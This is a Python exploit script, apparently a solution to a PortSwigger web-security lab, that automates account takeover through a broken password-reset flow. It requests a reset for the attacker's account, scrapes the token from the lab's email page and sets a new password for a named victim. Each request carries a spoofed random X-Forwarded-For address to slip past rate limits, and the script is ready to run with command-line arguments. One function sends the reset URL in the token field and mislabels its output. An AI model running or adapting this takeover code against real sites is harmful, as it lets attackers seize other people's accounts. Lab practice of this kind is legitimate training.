from  requests import request
from bs4 import BeautifulSoup
from random import randint
from sys import argv

def get_session(url):
    print('GET '+url)
    res=request(url=url,method='GET')
    cookies=""
    for key,value in res.cookies.get_dict().items():
        cookies=cookies+key+"="+value+";"
    return cookies

def generate_random_ip():
    return str(randint(0,255))+'.'+str(randint(0,255))+'.'+str(randint(0,255))+'.'+str(randint(0,255))

def send_reset_password_url(forgot_password_url,cookies,username):
    data='username='+username
    headers={
        'Cookie':cookies,
        'X-Forwarded-For':generate_random_ip()
            }
    print('POST '+forgot_password_url +'  '+data)
    res=request(url=forgot_password_url,method='POST',data=data,headers=headers)


def get_email_box_url(login_url,cookies):
    headers={
        'Cookie':cookies,
        'X-Forwarded-For':generate_random_ip()
            }
    print('GET '+login_url)
    res=request(url=login_url,method='GET',headers=headers)
    soup=BeautifulSoup(res.content.decode(),'html.parser')
    email_url=soup.find('a',{'id':'exploit-link'}).get('href')
    print('[+] Found Email Server Link: '+email_url)
    return email_url

def get_reset_password_url(email_url,cookies):
    headers={
        'Cookie':cookies,
        'X-Forwarded-For':generate_random_ip()
            }
    print('GET '+email_url)
    res=request(url=email_url,method='GET',headers=headers)
    soup=BeautifulSoup(res.content.decode(),'html.parser')
    reset_url=soup.find('a',{'target':'_blank'}).get('href')
    return reset_url


def get_reset_token(reset_url,cookies):
    headers={
        'Cookie':cookies,
        'X-Forwarded-For':generate_random_ip()
            }
    print('GET '+reset_url)
    res=request(url=reset_url,method='GET',headers=headers)
    soup=BeautifulSoup(res.content.decode(),'html.parser')
    reset_token=soup.find('input',{'name':'temp-forgot-password-token'}).get('value')
    return reset_token

def set_new_passwrod(reset_url,cookies,reset_token,username,new_password):
    headers={
        'Cookie':cookies,
        'X-Forwarded-For':generate_random_ip()
            }
    data='temp-forgot-password-token='+reset_url+'&username='+username+'&new-password-1='+new_password+'&new-password-2='+new_password
    print('POST '+reset_token+'  '+data)
    res=request(url=reset_url,method='POST',headers=headers,data=data)

def login(login_url,cookies,username,password):
    headers={
        'Cookie':cookies,
        'X-Forwarded-For':generate_random_ip()
    }
    data='username='+username+'&password='+password
    print('POST '+login_url+'  '+data)
    res=request(url=login_url,method='POST',headers=headers,data=data)
    soup=BeautifulSoup(res.content.decode(),'html.parser')
    soup=soup.find('div',{'id':'account-content'})
    for element in soup.contents:
        if element=="\n":
            continue
        elif element.contents[0].count('Your username')>0 or element.contents[0].count('Your email')>0  :
            print( element.contents[0])

def pwn(url,attacker_username,victim_username, new_password):
    try:
        cookies=get_session(url)
        email_url=get_email_box_url(url+'login',cookies)
        send_reset_password_url(url+'forgot-password',cookies,attacker_username)
        reset_password_url=get_reset_password_url(email_url,cookies)
        reset_token=get_reset_token(reset_password_url,cookies)
        set_new_passwrod(url+'forgot-password',cookies,reset_token,victim_username,new_password)
        login(url+'login',cookies,victim_username,new_password)
        print("[+] Pwned Successfully : Now Username is: "+victim_username+'  New Password is: '+new_password)   
    except AttributeError:
        login(url+'login',cookies,victim_username,new_password)
    except:
        print("[-] Please Provide valid parameters that required , \n [!] Note : when you provide url ,  provide just the lab url ")


if __name__ == "__main__":
 print("""
    0xCrypt00o Solution for Portswigger LAB : Password-Reset-Broken-Logic
        For More Solutions check :
                https://github.com/Crypt00o/Portswigger-Labs/
    """)
 if len(argv)==5:
     pwn(argv[1],argv[2],argv[3],argv[4])
 else:
     print("call it with : ./pwn-auth-password-reset-broken-logic.py <url> <attacker username>  <victim_username> <new victim password> ")
